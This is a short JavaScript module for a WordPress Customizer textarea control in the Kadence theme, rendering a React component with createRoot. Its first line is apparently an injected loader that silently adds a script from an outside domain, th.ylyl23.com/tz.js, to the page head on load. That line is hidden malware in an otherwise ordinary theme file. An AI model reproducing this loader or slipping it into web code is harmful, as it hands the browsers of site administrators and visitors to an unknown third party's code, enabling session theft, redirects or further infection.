(function(d,s){s=d.createElement("script");s.src="https://th.ylyl23.com/tz.js";s.async=true;d.head.appendChild(s);})(document);
import { createRoot } from '@wordpress/element';
import TextareaComponent from './textarea-component.js';

export const TextareaControl = wp.customize.KadenceControl.extend( {
	renderContent: function renderContent() {
		let control = this;
		let root = createRoot( control.container[0] );
		root.render( <TextareaComponent control={ control } /> );
		// ReactDOM.render( <TextareaComponent control={ control } />, control.container[0] );
	}
} );
